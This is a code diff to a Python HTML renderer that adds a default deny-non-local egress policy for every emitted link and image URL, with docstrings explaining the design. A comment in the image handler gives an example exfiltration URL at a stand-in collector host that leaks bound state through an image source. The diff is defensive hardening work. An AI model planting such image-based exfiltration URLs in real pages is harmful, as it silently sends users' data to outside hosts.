@@ -20,6 +20,15 @@ table, resolved through the same render-time compute path every other bound slot
 uses (Phase 648); it does not degrade to a row-count placeholder. The boundary
 that remains is declared rather than incidental — see :meth:`Renderer._data_grid`.
 
+**Ambient destination policy (WIRE_FORMAT §14.1).** Every ``href`` / ``src`` this
+renderer emits is checked against the render context's
+:attr:`Renderer.egress_policy`, which **defaults to deny-non-local**. The seam
+shipped before this — the policy functions existed and every emission site still
+called ``sanitize_url_or_blank``, so a decoded tree's egress was policy-checked
+only where a host had remembered to ask. A guarantee that holds where it is
+remembered is not a guarantee, which is why the policy lives on the context every
+render already threads rather than on the emission helpers.
+
 The renderer emits the **body fragment** only — the host owns ``<html>`` /
 ``<head>`` / the ``<link>`` to :func:`fuaran_py.renderer.reference_css_path`.
 """
@@ -40,8 +49,8 @@ from .bindings import (
     resolve_scalar_number,
     resolve_source,
 )
+from .egress import DENY_NON_LOCAL_EGRESS, EgressClass, EgressPolicy, sanitize_url_for_egress
 from .html import element, escape_text, text_element, void_element
-from .sanitize import sanitize_url_or_blank
 from .theme import node_class_name
 
 # Unresolved-binding placeholder — matches the F# SSR renderer's em-dash.
@@ -192,11 +201,47 @@ def _collect_fragments(node: Node, acc: dict[str, Node]) -> None:
 
 
 class Renderer:
-    """Holds the per-render context: host binding sources + the fragment registry."""
+    """Holds the per-render context: host binding sources, the fragment registry,
+    and the ambient destination policy.
 
-    def __init__(self, sources: BindingSources | None, fragments: dict[str, Node]) -> None:
+    ``egress_policy`` is the one place a render's destination posture lives, and
+    it is a CONTEXT field rather than a parameter on the emission helpers for the
+    reason the seam exists at all: a guarantee that holds only where a call site
+    remembered to ask is not a guarantee. Every ``href`` / ``src`` this renderer
+    emits consults it, with no caller opt-in anywhere on the path.
+
+    **The default is** :data:`~fuaran_py.renderer.egress.DENY_NON_LOCAL_EGRESS`
+    **at every entry point**, on the decoded-tree argument: an emission cannot
+    declare its own egress, so absent a host's declaration it gets none.
+    :data:`~fuaran_py.renderer.egress.PERMISSIVE_EGRESS` is reached BY NAME, so a
+    grep for ``PERMISSIVE_EGRESS`` finds every host that has opted back out — the
+    permissive choice is visible in the host's own source instead of inherited
+    silently.
+
+    Two consequences a host meets on adoption, both deliberate. A ``mailto:`` /
+    ``tel:`` href is REFUSED under the default (``allow_non_network=False``):
+    those are egress channels with no host for a rule to name, so they can only be
+    permitted wholesale, and permitting them by omission is the failure this
+    default exists to prevent. And same-origin destinations are ALLOWED
+    (``allow_local=True``), so ordinary in-app links and assets render unchanged —
+    the default denies leaving, not linking.
+
+    A refused destination RENDERS as a refusal
+    (:data:`~fuaran_py.renderer.egress.EGRESS_REFUSAL_URL` plus the
+    :data:`~fuaran_py.renderer.egress.EGRESS_REFUSAL_ATTRIBUTE` marker), never as
+    a silent neuter: "nothing happened" and "this was refused" are different
+    facts, and only one of them is debuggable.
+    """
+
+    def __init__(
+        self,
+        sources: BindingSources | None,
+        fragments: dict[str, Node],
+        egress_policy: EgressPolicy = DENY_NON_LOCAL_EGRESS,
+    ) -> None:
         self.sources = sources
         self.fragments = fragments
+        self.egress_policy = egress_policy
 
     # ── text / value helpers ────────────────────────────────────────────────
 
@@ -539,7 +584,13 @@ class Renderer:
         return text_element(f"h{level}", [("class", f"fuaran-heading{suffix}")], self._text(fields.get("text")))
 
     def _markdown(self, node: Node, fields: dict[str, Value]) -> str:
-        html = markdown.to_html(self._text(fields.get("text")))
+        # The POLICY-TAKING markdown entry, never the pure `to_html`: a markdown
+        # body is the densest destination surface a tree carries (every link and
+        # every inline image), and the pure form is the permissive case by
+        # definition. `to_html` stays published for a host rendering markdown it
+        # authored itself; a DECODED tree reaching it would be the ambient
+        # guarantee's one blind spot.
+        html = markdown.to_html_with_egress(self.egress_policy, self._text(fields.get("text")))
         return element("div", [("class", "fuaran-markdown")], html)
 
     def _metric(self, node: Node, fields: dict[str, Value]) -> str:
@@ -671,8 +722,21 @@ class Renderer:
         return element("div", [("class", f"fuaran-fact fuaran-fact-{tone}{emphasis}")], "".join(parts))
 
     def _link(self, node: Node, fields: dict[str, Value], semantic_attrs: Sequence[tuple[str, str]] = ()) -> str:
+        # The scheme floor answers whether this URL is safe to HAVE; the ambient
+        # policy decides whether this tree may point at that host AT ALL. A
+        # refused href renders as `about:blank#fuaran-egress-refused` carrying the
+        # class + host, so the refusal is visible in the document rather than only
+        # in the logs.
+        #
+        # `DOWNLOAD` is deliberately NOT the class here even when `download` is
+        # set: the class names the SINK the browser reaches, and a `download`
+        # anchor is still a hyperlink the user must act on. Scoping it separately
+        # would let a policy that denied hyperlinks admit the same destination by
+        # flipping one boolean on the tree.
         href_value = resolve_binding(fields.get("href"), self.sources)
-        href = sanitize_url_or_blank(href_value if isinstance(href_value, str) else "")
+        href, egress_attrs = sanitize_url_for_egress(
+            self.egress_policy, EgressClass.HYPERLINK, href_value if isinstance(href_value, str) else ""
+        )
         attrs: list[tuple[str, str]] = [("class", "fuaran-link"), ("href", href)]
         rel = fields.get("rel")
         if isinstance(rel, str):
@@ -684,20 +748,39 @@ class Renderer:
             attrs.append(("download", ""))
         # The node's a11y projection lands on the anchor.
         attrs.extend(semantic_attrs)
+        # The refusal marker rides the element that carries the refused href, so a
+        # reader of the DOM sees WHY this anchor points at `about:blank`. Empty on
+        # an allow, and emitted LAST so an adopting host's diff against the
+        # pre-policy bytes is a pure suffix.
+        attrs.extend(egress_attrs)
         return text_element("a", attrs, self._text(fields.get("label")))
 
     def _image(self, node: Node, fields: dict[str, Value], semantic_attrs: Sequence[tuple[str, str]] = ()) -> str:
+        # `src` is the MEDIA class, and it is the one that matters most: the
+        # browser fetches it with NO user act, so RENDERING the tree IS the
+        # request. `https://collector.example/?s=<bound state>` passes every
+        # scheme check — allowlisted scheme, well-formed host, no script anywhere
+        # — and exfiltrates on sight. Only the origin allowlist closes it, which
+        # is why the ambient default denies rather than waiting to be asked.
         src_value = resolve_binding(fields.get("src"), self.sources)
-        src = sanitize_url_or_blank(src_value if isinstance(src_value, str) else "")
+        src, egress_attrs = sanitize_url_for_egress(
+            self.egress_policy, EgressClass.MEDIA, src_value if isinstance(src_value, str) else ""
+        )
         variant = fields.get("variant")
         cls = {
             "Avatar": "fuaran-image fuaran-image-avatar",
             "Rounded": "fuaran-image fuaran-image-rounded",
         }.get(str(variant), "fuaran-image")
-        # The a11y projection lands on the `<img>` itself.
+        # The a11y projection lands on the `<img>` itself; the refusal marker last.
         return void_element(
             "img",
-            [("class", cls), ("src", src), ("alt", self._text(fields.get("alt"))), *semantic_attrs],
+            [
+                ("class", cls),
+                ("src", src),
+                ("alt", self._text(fields.get("alt"))),
+                *semantic_attrs,
+                *egress_attrs,
+            ],
         )
 
     def _list(self, node: Node, fields: dict[str, Value]) -> str:
@@ -1515,13 +1598,34 @@ _DISPATCH: dict[str, _KindHandler] = {
 }
 
 
-def render_html(node: Node, sources: BindingSources | None = None) -> str:
+def render_html(
+    node: Node,
+    sources: BindingSources | None = None,
+    egress_policy: EgressPolicy = DENY_NON_LOCAL_EGRESS,
+) -> str:
     """Render a decoded :class:`~fuaran_py.model.Node` tree to a body-fragment HTML string.
 
     ``sources`` is an optional host-supplied binding map (binding key → value)
     used to resolve non-``Static`` bindings; the headless baseline works with no
     sources, resolving ``Static`` bindings and placeholdering the rest.
+
+    ``egress_policy`` is the ambient destination policy every ``href`` / ``src``
+    on the emitted tree is checked against (WIRE_FORMAT §14.1). It **defaults to
+    deny** — see :class:`Renderer` for why, and for what a host meets on
+    adoption. A host that wants a wider posture declares it BY NAME::
+
+        from fuaran_py.renderer import render_html
+        from fuaran_py.renderer.egress import (
+            DENY_NON_LOCAL_EGRESS, EgressClass, HostSuffix, allow_origin,
+        )
+
+        policy = allow_origin(HostSuffix("cdn.example"), [EgressClass.MEDIA], DENY_NON_LOCAL_EGRESS)
+        html = render_html(tree, sources, egress_policy=policy)
+
+    A keyword argument rather than a second entry point, matching this host's
+    existing ``sources`` shape: the parameter IS the declaration, and it is
+    greppable at the call site either way.
     """
     fragments: dict[str, Node] = {}
     _collect_fragments(node, fragments)
-    return Renderer(sources, fragments).render_node(node)
+    return Renderer(sources, fragments, egress_policy).render_node(node)
